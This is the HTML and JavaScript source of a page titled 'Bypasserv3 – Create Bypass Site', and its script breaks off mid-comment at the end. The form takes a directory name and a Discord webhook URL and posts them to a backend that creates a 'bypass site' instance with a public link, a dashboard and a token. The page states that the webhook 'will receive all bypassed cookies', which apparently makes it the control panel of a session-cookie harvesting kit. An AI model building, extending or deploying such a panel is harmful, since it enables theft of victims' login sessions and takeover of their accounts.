<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Create Bypass Site - Bypasserv3</title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: #1a1d2e;
            color: #e5e7eb;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 440px;
        }

        .card {
            background: #252938;
            border-radius: 20px;
            padding: 40px 35px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(139, 92, 246, 0.1);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .icon {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #8b5cf6, #7c3aed);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 32px;
            box-shadow: 0 10px 30px rgba(139, 92, 246, 0.4);
        }

        .title {
            font-size: 28px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 15px;
            color: #9ca3af;
        }

        .info-box {
            background: rgba(59, 130, 246, 0.12);
            border: 1px solid rgba(59, 130, 246, 0.25);
            border-radius: 12px;
            padding: 14px 16px;
            margin-bottom: 28px;
            font-size: 13px;
            color: #93c5fd;
            display: flex;
            align-items: flex-start;
            gap: 10px;
        }

        .info-box i {
            margin-top: 2px;
            font-size: 16px;
        }

        .info-box strong {
            color: #dbeafe;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 24px;
        }

        .form-label {
            display: block;
            margin-bottom: 10px;
            font-size: 14px;
            font-weight: 500;
            color: #d1d5db;
        }

        .input-wrapper {
            position: relative;
        }

        .input-icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #6b7280;
            font-size: 16px;
            z-index: 1;
        }

        .form-input {
            width: 100%;
            padding: 14px 16px 14px 46px;
            background: #1e2230;
            border: 1px solid rgba(139, 92, 246, 0.3);
            border-radius: 10px;
            color: #e5e7eb;
            font-family: 'Inter', sans-serif;
            font-size: 14px;
            transition: all 0.2s ease;
        }

        .form-input::placeholder {
            color: #6b7280;
        }

        .form-input:focus {
            outline: none;
            border-color: #8b5cf6;
            background: #1a1d2e;
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.15);
        }

        .form-help {
            font-size: 12px;
            color: #9ca3af;
            margin-top: 8px;
        }

        .submit-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #8b5cf6 0%, #7c3aed 100%);
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 4px 15px rgba(139, 92, 246, 0.3);
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.4);
            background: linear-gradient(135deg, #9333ea 0%, #7c3aed 100%);
        }

        .submit-btn:active {
            transform: translateY(0);
        }

        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .footer-text {
            text-align: center;
            margin-top: 24px;
            font-size: 14px;
            color: #9ca3af;
        }

        .footer-text a {
            color: #a78bfa;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.2s;
        }

        .footer-text a:hover {
            color: #c4b5fd;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="header">
                <div class="icon">
                    <i class="fas fa-pen"></i>
                </div>
                <h1 class="title">Create Bypass Site</h1>
                <p class="subtitle">Generate your bypass site in seconds</p>
            </div>

            <div class="info-box">
                <i class="fas fa-info-circle"></i>
                <div>
                    <strong>ℹ️ Note:</strong> Your webhook will receive all bypassed cookies from your site.
                </div>
            </div>

            <form id="generatorForm">
                <div class="form-group">
                    <label class="form-label">Directory Name</label>
                    <div class="input-wrapper">
                        <i class="fas fa-folder input-icon"></i>
                        <input 
                            type="text" 
                            class="form-input" 
                            id="directory"
                            placeholder="my-bypass-instance"
                            pattern="[A-Za-z0-9_-]{3,32}"
                            required
                            autocomplete="off"
                        >
                    </div>
                    <div class="form-help">3-32 characters (letters, numbers, hyphens, underscores only)</div>
                </div>

                <div class="form-group">
                    <label class="form-label">Webhook Url (Needed)</label>
                    <div class="input-wrapper">
                        <i class="fas fa-link input-icon"></i>
                        <input 
                            type="url" 
                            class="form-input" 
                            id="userWebhook"
                            placeholder="https://discord.com/api/webhooks/..."
                            required
                            autocomplete="off"
                        >
                    </div>
                    <div class="form-help">Webhook Url (Needed)</div>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">
                    <i class="fas fa-rocket"></i>
                    <span>Generate Instance</span>
                </button>
            </form>

            <div class="footer-text">
                Already have an instance? <a href="../dashboard/sign-in.php">Sign in</a>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('generatorForm');
        const submitBtn = document.getElementById('submitBtn');
        const directoryInput = document.getElementById('directory');
        const userWebhookInput = document.getElementById('userWebhook');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const directory = directoryInput.value.trim();
            const userWebhook = userWebhookInput.value.trim();

            // Validate directory format
            if (!/^[A-Za-z0-9_-]{3,32}$/.test(directory)) {
                Swal.fire({
                    title: 'Invalid Directory',
                    text: 'Directory must be 3-32 characters (letters, numbers, hyphens, underscores only)',
                    icon: 'error',
                    background: '#252938',
                    color: '#e5e7eb',
                    confirmButtonColor: '#8b5cf6'
                });
                return;
            }

            // Validate webhook URL
            if (!userWebhook) {
                Swal.fire({
                    title: 'Webhook Required',
                    text: 'Please enter your Discord webhook URL',
                    icon: 'error',
                    background: '#252938',
                    color: '#e5e7eb',
                    confirmButtonColor: '#8b5cf6'
                });
                return;
            }

            // Disable button
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Creating...</span>';

            try {
                const response = await fetch('create.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        directory: directory,
                        userWebhook: userWebhook
                    })
                });

                const data = await response.json();

                if (data.success) {
                    await Swal.fire({
                        title: 'Success!',
                        html: `
                            <div style="text-align: left; padding: 20px;">
                                <p style="margin-bottom: 15px; color: #9ca3af;">Your instance has been created!</p>
                                
                                <div style="margin-bottom: 15px;">
                                    <strong style="color: #a78bfa;">🔗 Public Link:</strong><br>
                                    <code style="background: rgba(139, 92, 246, 0.15); padding: 10px; border-radius: 6px; display: block; margin-top: 5px; word-break: break-all; color: #e5e7eb;">${data.publicUrl}</code>
                                </div>
                                
                                <div style="margin-bottom: 15px;">
                                    <strong style="color: #a78bfa;">📊 Dashboard:</strong><br>
                                    <code style="background: rgba(139, 92, 246, 0.15); padding: 10px; border-radius: 6px; display: block; margin-top: 5px; word-break: break-all; color: #e5e7eb;">${data.dashboardUrl}</code>
                                </div>
                                
                                <div style="margin-bottom: 15px;">
                                    <strong style="color: #a78bfa;">🔑 Token:</strong><br>
                                    <code style="background: rgba(139, 92, 246, 0.15); padding: 10px; border-radius: 6px; display: block; margin-top: 5px; word-break: break-all; color: #e5e7eb;">${data.token}</code>
                                </div>
                                
                                <p style="color: #10b981; margin-top: 15px;">✅ Check your Discord webhook for details!</p>
                            </div>
                        `,
                        icon: 'success',
                        background: '#252938',
                        color: '#e5e7eb',
                        confirmButtonColor: '#8b5cf6',
                        confirmButtonText: 'Go to Dashboard',
                        width: '600px'
                    });

                    // Redirect to dashboard
                    window.location.href = data.dashboardUrl;
                } else {
                    Swal.fire({
                        title: 'Error',
                        text: data.error || 'Failed to create instance',
                        icon: 'error',
                        background: '#252938',
                        color: '#e5e7eb',
                        confirmButtonColor: '#8b5cf6'
                    });

                    // Re`*

